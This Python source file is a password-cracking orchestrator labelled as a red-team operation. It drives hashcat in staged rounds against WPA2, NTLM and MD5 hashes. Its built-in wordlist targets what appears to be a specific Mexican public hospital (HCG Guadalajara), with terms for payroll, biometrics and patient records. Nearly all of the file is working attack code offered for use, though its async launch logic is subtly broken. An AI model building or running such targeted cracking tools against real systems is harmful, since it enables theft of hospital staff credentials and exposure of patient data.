#!/usr/bin/env python3
"""
🛡️ HCG Framework - Distributed Password Cracking Orchestrator
[CLASSIFIED]: CONFIDENTIAL - HCG Red Team Operation

Orquestación de hashcat en múltiples rondas con estrategias diferentes.
NO reimplementa cracking — delega a hashcat GPU y monitorea progreso.
"""

import asyncio
import subprocess
import os
import time
from typing import Dict, List, Optional, Any
from dataclasses import dataclass


@dataclass
class CrackingSession:
    """Sesión de cracking activa."""
    session_id: str
    hashes_file: str
    wordlist: str
    rules: List[str]
    masks: Optional[List[str]]
    mode: int
    status: str = "running"
    cracked: int = 0
    total: int = 0
    progress: float = 0.0
    eta_seconds: int = 0
    start_time: float = 0.0
    end_time: Optional[float] = None
    result_file: str = ""


class DistributedCracker:
    """
    Orquestador de cracking distribuido con hashcat.
    
    Rondas típicas para WPA2/NTLM:
    
    Round 1 — Inmediato (< 1 min):
    - Wordlist contextual (hospital, hcg, guadalajara...)
    - Reglas: best64
    - Objetivo: creds triviales
    
    Round 2 — Rápido (< 30 min):
    - rockyou.txt
    - best64.rule
    - Objetivo: creds humanas comunes
    
    Round 3 — Medio (< 4 horas):
    - rockyou + combinaciones
    - dive.rule
    - Mask attack: ?u?l?l?l?l?d?d?d?s
    - Objetivo: creds institucionales
    
    Round 4 — Largo (solo si 1-3 fallaron):
    - Prince attack
    - Markov chain
    - Objetivo: creds fuertes
    """
    
    # Wordlists contextuales para HCG
    CONTEXTUAL_WORDS = [
        'hospitalcivil', 'guadalajara', 'hcg2024', 'hcg2025', 'hcg2026',
        'HCG2024!', 'Hospital2025', 'redopdhcg', 'opdhcg', 'civil123',
        'gob.mx', 'jalisco', 'medicina', 'hospital', 'admin123',
        'password123', 'opd-hcg.org', 'HCGveracruz', 'Sigma', 'expediente',
        'intranet', 'empleado', 'pah', 'jim3', 'sii', 'FONSABI',
        'firma', 'biometrico', 'rh', 'nomina', 'salud', 'doctor',
        'enfermera', 'paciente', 'clinico', 'urgencias', 'quirofano'
    ]
    
    def __init__(self, hashcat_path: str = "hashcat", output_dir: str = "./cracked"):
        self.hashcat_path = hashcat_path
        self.output_dir = output_dir
        self.sessions: Dict[str, CrackingSession] = {}
        self.running = False
        
        os.makedirs(output_dir, exist_ok=True)
    
    def _generate_contextual_wordlist(self) -> str:
        """Genera archivo temporal con wordlist contextual."""
        import tempfile
        
        fd, path = tempfile.mkstemp(suffix='.txt', prefix='hcg_contextual_')
        with os.fdopen(fd, 'w') as f:
            for word in self.CONTEXTUAL_WORDS:
                f.write(word + '\n')
                # Variaciones con números
                for year in ['2023', '2024', '2025', '2026']:
                    f.write(f'{word}{year}\n')
                    f.write(f'{word}{year}!\n')
                # Variaciones con símbolos
                f.write(f'{word}!\n')
                f.write(f'{word}@123\n')
        
        return path
    
    def crack_campaign(
        self,
        hashes_file: str,
        mode: int = 2500,  # WPA2 por defecto
        strategy: str = 'aggressive'
    ) -> List[CrackingSession]:
        """
        Lanza campaña de cracking en múltiples rondas.
        
        Args:
            hashes_file: Archivo con hashes a crackear
            mode: Modo hashcat (2500=WPA2, 1000=NTLM, 0=MD5)
            strategy: 'fast', 'balanced', o 'aggressive'
            
        Returns:
            Lista de sesiones de cracking activas
        """
        sessions = []
        
        # Round 1: Contextual (rápido)
        sessions.append(self._launch_hashcat(
            hashes=hashes_file,
            wordlist=self._generate_contextual_wordlist(),
            rules=['best64.rule'],
            mode=mode,
            workload=3,
            timeout=60,
            session_id=f'r1_contextual_{int(time.time())}'
        ))
        
        if strategy in ('balanced', 'aggressive'):
            # Round 2: Rockyou (medio)
            sessions.append(self._launch_hashcat(
                hashes=hashes_file,
                wordlist='/usr/share/wordlists/rockyou.txt',
                rules=['best64.rule'],
                mode=mode,
                workload=3,
                timeout=1800,  # 30 min
                session_id=f'r2_rockyou_{int(time.time())}'
            ))
        
        if strategy == 'aggressive':
            # Round 3: Extended con masks
            sessions.append(self._launch_hashcat(
                hashes=hashes_file,
                wordlist='/usr/share/wordlists/rockyou.txt',
                rules=['dive.rule'],
                masks=['?u?l?l?l?l?d?d?d?s', '?u?l?l?l?l?d?d?d?d'],
                mode=mode,
                workload=3,
                timeout=14400,  # 4 horas
                session_id=f'r3_extended_{int(time.time())}'
            ))
        
        return sessions
    
    def _launch_hashcat(
        self,
        hashes: str,
        wordlist: str,
        rules: List[str],
        mode: int,
        workload: int,
        timeout: int,
        session_id: str,
        masks: Optional[List[str]] = None
    ) -> CrackingSession:
        """Lanza sesión individual de hashcat."""
        
        result_file = os.path.join(self.output_dir, f'{session_id}.cracked')
        
        # Construir comando
        cmd = [
            self.hashcat_path,
            '-m', str(mode),
            hashes,
            wordlist,
            '-w', str(workload),
            '--session', session_id,
            '--status',
            '--status-timer=30',
            '--outfile', result_file,
            '--quiet'
        ]
        
        # Agregar reglas
        for rule in rules:
            rule_path = f'/usr/share/hashcat/rules/{rule}'
            if os.path.exists(rule_path):
                cmd.extend(['-r', rule_path])
        
        # Agregar masks si existen
        if masks:
            cmd.extend(['-a', '3'])
            for mask in masks:
                cmd.append(mask)
        
        session = CrackingSession(
            session_id=session_id,
            hashes_file=hashes,
            wordlist=wordlist,
            rules=rules,
            masks=masks,
            mode=mode,
            start_time=time.time(),
            result_file=result_file
        )
        
        self.sessions[session_id] = session
        
        # Lanzar en background
        asyncio.create_task(self._run_hashcat_async(cmd, session, timeout))
        
        return session
    
    async def _run_hashcat_async(
        self,
        cmd: List[str],
        session: CrackingSession,
        timeout: int
    ):
        """Ejecuta hashcat asíncronamente con monitoreo."""
        try:
            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            # Monitorear salida
            while True:
                line = await proc.stdout.readline()
                if not line:
                    break
                
                line_str = line.decode('utf-8', errors='replace').strip()
                
                # Parsear progreso de hashcat
                if 'Progress' in line_str:
                    parts = line_str.split()
                    for i, p in enumerate(parts):
                        if p.endswith('%'):
                            try:
                                session.progress = float(p.rstrip('%'))
                            except:
                                pass
                
                # Verificar si terminó
                if 'Status' in line_str and 'Exhausted' in line_str:
                    session.status = 'exhausted'
                    break
                elif 'Recovered' in line_str:
                    # Extraer count
                    session.cracked += 1
            
            await proc.wait()
            session.end_time = time.time()
            
            if proc.returncode == 0:
                session.status = 'completed'
            else:
                session.status = 'failed'
                
        except Exception as e:
            session.status = 'error'
            print(f"[CrackingSession {session.session_id}] Error: {e}")
    
    def _monitor_sessions(self, sessions: List[CrackingSession]) -> Optional[str]:
        """
        Monitorea sesiones concurrentes. Detiene al primer éxito.
        
        Returns:
            Primer password crackeado o None
        """
        self.running = True
        
        while self.running and sessions:
            all_done = True
            first_crack = None
            
            for s in sessions:
                if s.status in ('running',):
                    all_done = False
                    
                    # Leer archivo de resultados
                    if os.path.exists(s.result_file):
                        with open(s.result_file, 'r') as f:
                            lines = f.readlines()
                            if lines:
                                first_crack = lines[0].strip().split(':')[-1]
                                self.running = False  # Detener todo
                                break
                
                # Verificar timeout
                if s.status == 'running' and s.start_time > 0:
                    elapsed = time.time() - s.start_time
                    # Timeout manejado por el proceso mismo
            
            if first_crack:
                return first_crack
            
            if all_done:
                break
            
            time.sleep(5)
        
        # Retornar primero crackeado si existe
        for s in sessions:
            if os.path.exists(s.result_file):
                with open(s.result_file, 'r') as f:
                    content = f.read().strip()
                    if content:
                        return content.split(':')[-1]
        
        return None
    
    def stop_all(self):
        """Detiene todas las sesiones activas."""
        self.running = False
        # En producción: enviar señal a procesos hashcat
    
    def get_status(self, session_id: str) -> Optional[Dict[str, Any]]:
        """Obtiene estado de una sesión."""
        session = self.sessions.get(session_id)
        if not session:
            return None
        
        return {
            'session_id': session.session_id,
            'status': session.status,
            'progress': session.progress,
            'cracked': session.cracked,
            'elapsed': time.time() - session.start_time if session.start_time else 0,
            'result_file': session.result_file
        }


if __name__ == "__main__":
    import sys
    
    print("=" * 60)
    print("HCG Framework - Distributed Cracking Orchestrator")
    print("=" * 60)
    
    if len(sys.argv) < 2:
        print("\nUso: python cracking.py <hashfile> [mode]")
        print("Ejemplo: python cracking.py capture.hc22000 2500")
        print("\nModos comunes:")
        print("  2500 = WPA2 (handshake)")
        print("  1000 = NTLM")
        print("  0    = MD5")
        sys.exit(1)
    
    hashfile = sys.argv[1]
    mode = int(sys.argv[2]) if len(sys.argv) > 2 else 2500
    
    if not os.path.exists(hashfile):
        print(f"[!] Error: Archivo de hashes no encontrado: {hashfile}")
        sys.exit(1)
    
    cracker = DistributedCracker()
    
    print(f"\n[*] Iniciando campaña de cracking:")
    print(f"    Hash file: {hashfile}")
    print(f"    Mode: {mode}")
    print(f"    Strategy: aggressive (3 rondas)")
    
    sessions = cracker.crack_campaign(hashfile, mode=mode, strategy='aggressive')
    
    print(f"\n[*] Sesiones lanzadas: {len(sessions)}")
    for s in sessions:
        print(f"    - {s.session_id}: {s.wordlist}")
    
    print("\n[*] Monitoreando progreso...")
    print("(Presiona Ctrl+C para detener)")
    
    try:
        result = cracker._monitor_sessions(sessions)
        
        if result:
            print(f"\n[+] ✅ PASSWORD CRACKEADO: {result}")
        else:
            print("\n[-] No se encontró password en el tiempo límite")
            
    except KeyboardInterrupt:
        print("\n[!] Interrumpido por usuario")
        cracker.stop_all()
